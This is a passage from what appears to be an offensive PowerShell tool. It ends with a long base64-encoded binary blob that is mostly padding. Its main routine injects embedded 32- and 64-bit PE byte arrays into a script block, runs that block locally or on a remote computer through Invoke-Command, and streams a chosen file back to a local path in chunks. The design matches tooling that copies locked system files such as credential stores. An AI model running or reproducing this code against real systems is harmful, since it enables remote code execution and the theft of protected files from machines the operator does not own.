AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    [UInt64]$Offset = 0
    

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
        if ($PsCmdlet.ParameterSetName -ieq "LocalDest")
        {
            $RemoteDestination = $LocalDestination   #More efficient when using $RemoteDestination, only opens read handle once
        }

		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes32, $PEBytes64, $Path, $RemoteDestination, $BufferSize, $Offset)
	}
	else
	{
        if ($PsCmdlet.ParameterSetName -ieq "LocalDest")
        {
            $RemoteDestination = $null
        }

        #If localdestination, loop and increment offset until the entire file is read
        do
        {
		    $Result = Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes32, $PEBytes64, $Path, $RemoteDestination, $BufferSize, $Offset) -ComputerName $ComputerName
            if ($Result -eq $null)
            {
                return $null
            }
            $BytesLeft = $Result.BytesLeft

			$FileStream = New-Object System.IO.FileStream $LocalDestination,([System.IO.FileMode]::Append)
			$FileStream.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
			$FileStream.Write($Result.Bytes, 0, $Result.BytesRead) | Out-Null
			$FileStream.Flush() | Out-Null
			$FileStream.Dispose() | Out-Null
			$FileStream = $null

            $Offset += $Result.BytesRead

            Write-Verbose "Copied $Offset bytes. $BytesLeft Bytes remaining"
        } while ($Result.BytesLeft -gt 0)
	}
}

Main

[GC]::Collect()
[GC]::Collect()
}
